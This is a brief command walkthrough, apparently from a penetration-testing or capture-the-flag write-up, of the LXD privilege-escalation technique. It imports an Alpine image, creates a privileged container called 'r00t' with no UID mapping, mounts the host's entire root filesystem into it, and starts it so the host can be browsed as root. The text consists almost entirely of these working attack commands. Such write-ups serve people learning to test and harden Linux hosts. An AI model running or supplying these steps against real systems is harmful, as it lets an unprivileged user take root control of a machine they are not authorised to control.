Start the LXD initialization process. Choose the defaults for each prompt. Consult this post for more information on each step:
```
lxd init
```

Import the local image:
```
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Start a privileged container with the security.privileged set to true to run the container without a UID mapping, 
making the root user in the container the same as the root user on the host.
```
lxc init alpine r00t -c security.privileged=true
```
Mount the host file system:
```
 lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
Browse mounted system as root.
```
lxc start r00t
```
